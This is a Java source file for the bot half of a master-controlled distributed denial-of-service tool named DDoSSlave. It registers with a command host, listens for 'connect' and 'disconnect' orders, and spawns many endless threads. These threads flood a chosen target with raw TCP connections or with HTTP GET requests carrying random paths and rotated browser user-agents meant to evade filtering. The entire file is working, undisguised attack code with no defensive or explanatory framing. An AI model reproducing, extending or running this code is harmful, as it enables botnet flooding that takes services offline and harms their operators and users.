import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.ThreadLocalRandom;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class DDoSSlave {
	
	public static final int slavePort = 12345;
	
	public static List<AttackDO> attacksList = new ArrayList<AttackDO>();
	
	public static boolean isValidIP(final String ip) {
		final Pattern PATTERN = Pattern.compile(
		        "^(([01]?\\d\\d?|2[0-4]\\d|25[0-5])\\.){3}([01]?\\d\\d?|2[0-4]\\d|25[0-5])$");
		return PATTERN.matcher(ip).matches();
	}
	
	public static boolean isValidPort(final String port) {
		boolean isValidPort = false;
		final Pattern PATTERN = Pattern.compile("^[0-9]+$");
		if(PATTERN.matcher(port).matches()) {
			if(Integer.parseInt(port) < 65536) {
				isValidPort = true;
			} else {
				isValidPort = false;
			}
		}
		return isValidPort;
	}

	public static boolean isValidHost(String hostName) {
		boolean isValidHost = false;
		try {
			InetAddress.getByName(hostName);
			isValidHost = true;
		} catch (UnknownHostException e) {
			isValidHost = false;
		}
		return isValidHost;
	}
	
	public static boolean isValidIPOrHost(String ipOrHost) {
		return isValidIP(ipOrHost) || isValidHost(ipOrHost);
	}

	public static boolean isValidConnectionCount(String connectionCount) {
		boolean isValidCount = false;
		final Pattern PATTERN = Pattern.compile("^[0-9]+$");
		if(PATTERN.matcher(connectionCount).matches()) {
			isValidCount = true;
		}
		return isValidCount;
	}
	
	public static boolean isValidURL(String url) {
		boolean isValidURL = false;
		final Pattern PATTERN = Pattern.compile("^url=/");
		if(PATTERN.matcher(url).find()) {
			isValidURL = true;
		}
		return isValidURL;
	}
	
	public static String extractURL(String url) {
		String matchURL = "";
		final Pattern PATTERN = Pattern.compile("^url=(/.*)");
		Matcher matcher = PATTERN.matcher(url);
		if(matcher.find()) {
			matchURL = matcher.group(1);
		}
		return matchURL;
	}
	
	public static String generateRandomString(int lowerBound, int upperBound) {
		int length = ThreadLocalRandom.current().nextInt(lowerBound, upperBound + 1);
		StringBuffer generatedString = new StringBuffer();
		StringBuffer possible = new StringBuffer("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789");
		for(int i = 0; i < length; i++) {
			generatedString = generatedString.append(possible.charAt(new Random().nextInt(possible.length())));
		}
		return generatedString.toString();
	}
	
	public static String getRandomUserAgent() {
		String[] userAgents = {"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
				"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
				"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
				"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
				"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
				"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
				"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
				"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
				"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50"};
		return userAgents[new Random().nextInt(userAgents.length - 1)];
	}
	
	public static void main(String[] args) throws NumberFormatException, UnknownHostException, IOException {
		if(args.length == 4) {
			if((args[0].equals("-h") && isValidIP(args[1]) && args[2].equals("-p") && isValidPort(args[3]))) {
				Socket socket = new Socket(args[1], Integer.parseInt(args[3]));
				PrintWriter pw = new PrintWriter(socket.getOutputStream(), true);
				pw.println("reg" + " " + InetAddress.getLocalHost().getHostAddress() + " " + slavePort);
			} else if((args[2].equals("-h") && isValidIP(args[3]) && args[0].equals("-p") && isValidPort(args[1]))) {
				Socket socket = new Socket(args[3], Integer.parseInt(args[1]));
				PrintWriter pw = new PrintWriter(socket.getOutputStream(), true);
				pw.println("reg" + " " + InetAddress.getLocalHost().getHostAddress() + " " + slavePort);
			} else {
				System.out.println("Usage:\n\tjava DDoSSlave -h [masterIPAddress] -p [masterPortNumber]\n\tPlease follow the proper format");
				System.exit(-1);
			}
		} else {
			System.out.println("Usage:\n\tjava DDoSSlave -h [masterIPAddress] -p [masterPortNumber]\n\tPlease follow the proper format");
			System.exit(-1);
		}
		
		new Thread(new MasterListener(slavePort)).start();
	}

	public static List<AttackDO> findAttacks(String targetIPAddress, String targetPort) {
		List<AttackDO> matchAttacks = new ArrayList<AttackDO>();
		for (AttackDO attack : attacksList) {
			if(attack.targetIPAddress.equals(targetIPAddress) && attack.targetPort.equals(targetPort)) {
				matchAttacks.add(attack);
			}
		}
		return matchAttacks;
	}
	
	public static List<AttackDO> findAttacks(String targetIPAddress) {
		List<AttackDO> matchAttacks = new ArrayList<AttackDO>();
		for (AttackDO attack : attacksList) {
			if(attack.targetIPAddress.equals(targetIPAddress)) {
				matchAttacks.add(attack);
			}
		}
		return matchAttacks;
	}

}

class CommandExecutor extends Thread {
	String targetAddress;
	String targetPort;
	boolean isKeepalive = false;
	boolean isHTTPAttack = false;
	String urlString;
	boolean isAttackLive = true;
	
	public CommandExecutor(String targetAddress, String targetPort) {
		this.targetAddress = targetAddress;
		this.targetPort = targetPort;
		this.urlString = "";
	}
	
	public CommandExecutor(String targetAddress, String targetPort, boolean isKeepalive) {
		this.targetAddress = targetAddress;
		this.targetPort = targetPort;
		this.isKeepalive = isKeepalive;
		this.urlString = "";
	}

	public CommandExecutor(String targetAddress, String targetPort, boolean isHTTPAttack, String url) {
		this.targetAddress = targetAddress;
		this.targetPort = targetPort;
		this.isHTTPAttack = isHTTPAttack;
		this.urlString = url;
	}

	public void terminate() {
		isAttackLive = false;
	}
	
	@Override
	public void run() {
		while(true) {
			if(!isAttackLive) {
				break;
			}
			try {
				if(isHTTPAttack) {
					URL url = new URL("http://" + InetAddress.getByName(targetAddress).getHostName() + ":" + targetPort  + urlString + DDoSSlave.generateRandomString(1, 10));
					HttpURLConnection con = (HttpURLConnection) url.openConnection();
					con.setRequestMethod("GET");
					con.setRequestProperty("User-Agent", DDoSSlave.getRandomUserAgent());
					int responseCode = con.getResponseCode();
					BufferedReader in = new BufferedReader(
					        new InputStreamReader(con.getInputStream()));
					String inputLine;
					long sizeRead = 0;
					while ((inputLine = in.readLine()) != null) {
						sizeRead += inputLine.getBytes().length;
					}
					System.out.println(sizeRead);
					in.close();
				} else {
					Socket socket = new Socket(targetAddress, Integer.parseInt(targetPort));
					if(isKeepalive) {
						socket.setSoTimeout(1000);
						socket.setKeepAlive(true);
					}
					PrintWriter pw = new PrintWriter(socket.getOutputStream(), true);
					pw.println(DDoSSlave.generateRandomString(1, 10));
				}
			} catch (NumberFormatException | IOException e) {
				e.printStackTrace();
			}
		}
	}
}

class MasterListener implements Runnable {
	
	int listenerPort;
	
	public MasterListener(int listenerPort) {
		this.listenerPort = listenerPort;
	}
	
	@Override
	public void run() {
		try {
			ServerSocket serverSocket = new ServerSocket(listenerPort);
			while(true) {
				Socket masterSocket = serverSocket.accept();
				BufferedReader br = new BufferedReader(new InputStreamReader(masterSocket.getInputStream()));
				String masterMessage = br.readLine();
				String[] commandComponents = masterMessage.split(" ");
				if(commandComponents[0].equals("connect")) {
					if(commandComponents.length == 5) {
						if(DDoSSlave.isValidIPOrHost(commandComponents[1]) && DDoSSlave.isValidPort(commandComponents[2]) && DDoSSlave.isValidConnectionCount(commandComponents[3])) {
							int loopCount = Integer.parseInt(commandComponents[3]);
							if(commandComponents[4].trim().equals("keepalive")) {
								while(loopCount-- != 0) {
									CommandExecutor attack = new CommandExecutor(commandComponents[1], commandComponents[2], true);
									attack.start();
									DDoSSlave.attacksList.add(new AttackDO(commandComponents[1], commandComponents[2], attack));
								}
							} else if(DDoSSlave.isValidURL(commandComponents[4])) {
								while(loopCount-- != 0) {
									CommandExecutor attack = new CommandExecutor(commandComponents[1], commandComponents[2], true, DDoSSlave.extractURL(commandComponents[4]));
									attack.start();
									DDoSSlave.attacksList.add(new AttackDO(commandComponents[1], commandComponents[2], attack));
								}
							} else {
								// Do nothing
							}
						}
					} else if(commandComponents.length == 4) {
						if(DDoSSlave.isValidIPOrHost(commandComponents[1]) && DDoSSlave.isValidPort(commandComponents[2])) {
							if(DDoSSlave.isValidConnectionCount(commandComponents[3])){
								int loopCount = Integer.parseInt(commandComponents[3]);
								while(loopCount-- != 0) {
									CommandExecutor attack = new CommandExecutor(commandComponents[1], commandComponents[2]);
									attack.start();
									DDoSSlave.attacksList.add(new AttackDO(commandComponents[1], commandComponents[2], attack));
								}
							} else if(commandComponents[3].trim().equals("keepalive")) {
								if(DDoSSlave.isValidIPOrHost(commandComponents[1]) && DDoSSlave.isValidPort(commandComponents[2])) {
									CommandExecutor attack = new CommandExecutor(commandComponents[1], commandComponents[2], true);
									attack.start();
									DDoSSlave.attacksList.add(new AttackDO(commandComponents[1], commandComponents[2], attack));
								}
							} else if(DDoSSlave.isValidURL(commandComponents[3])) {
								if(DDoSSlave.isValidIPOrHost(commandComponents[1]) && DDoSSlave.isValidPort(commandComponents[2])) {
									CommandExecutor attack = new CommandExecutor(commandComponents[1], commandComponents[2], true, DDoSSlave.extractURL(commandComponents[3]));
									attack.start();
									DDoSSlave.attacksList.add(new AttackDO(commandComponents[1], commandComponents[2], attack));
								}
							} else {
								// Do nothing
							}
						}
					} else if(commandComponents.length == 3) {
						if(DDoSSlave.isValidIPOrHost(commandComponents[1]) && DDoSSlave.isValidPort(commandComponents[2])) {
							CommandExecutor attack = new CommandExecutor(commandComponents[1], commandComponents[2]);
							attack.start();
							DDoSSlave.attacksList.add(new AttackDO(commandComponents[1], commandComponents[2], attack));
						}
					} else {
						// Do nothing
					}
				} else if(commandComponents[0].equals("disconnect")) {
					if(commandComponents.length == 3) {
						if(DDoSSlave.isValidIPOrHost(commandComponents[1]) && DDoSSlave.isValidPort(commandComponents[2])) {
							List<AttackDO> matchAttacks = DDoSSlave.findAttacks(commandComponents[1], commandComponents[2]);
							for (AttackDO attackDO : matchAttacks) {
								attackDO.attack.terminate();
							}
						}
					} else if(commandComponents.length == 2) {
						if(DDoSSlave.isValidIPOrHost(commandComponents[1])) {
							List<AttackDO> matchAttacks = DDoSSlave.findAttacks(commandComponents[1]);
							for (AttackDO attackDO : matchAttacks) {
								attackDO.attack.terminate();
							}
						}
					} else {
						// Do nothing
					}
				} else {
					// Do nothing
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}

class SlaveDO {
	
	String ipAddress;
	String port;
	
	public SlaveDO(String ipAddress, String port) {
		this.ipAddress = ipAddress;
		this.port = port;
	}
}

class AttackDO {
	String targetIPAddress;
	String targetPort;
	CommandExecutor attack;
	
	public AttackDO(String targetIPAddress, String targetPort, CommandExecutor attack) {
		this.targetIPAddress = targetIPAddress;
		this.targetPort = targetPort;
		this.attack = attack;
	}
}